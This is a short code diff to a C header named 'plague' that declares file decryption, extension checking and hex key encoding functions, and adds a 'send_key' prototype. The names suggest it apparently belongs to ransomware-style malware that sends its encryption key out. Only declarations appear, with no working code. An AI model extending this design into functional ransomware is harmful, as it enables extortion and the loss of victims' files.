@@ -24,5 +24,6 @@ void decrypt_file(unsigned char key[], unsigned char iv[], const char *path);
 int check_ext(const char *path);
 char *encode_hex(const unsigned char *key, int size);
 unsigned char    *decode_hex(char *hex, int size);
+int send_key(char *key);
 
 #endif //PLAGUE_PLAGUE_H
